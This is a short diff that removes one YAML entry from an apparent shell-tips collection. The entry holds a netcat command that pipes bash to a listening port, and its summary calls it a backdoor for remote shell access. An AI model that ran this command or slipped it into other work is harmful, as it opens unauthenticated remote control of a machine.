@@ -1,8 +1,0 @@
-commandlinefu_id: 4005
-translator:
-  weibo: ''
-hide: true
-command: |-
-  /bin/bash | nc -l 1234
-summary: |-
-  Create a backdoor on a machine to allow remote connection to bash
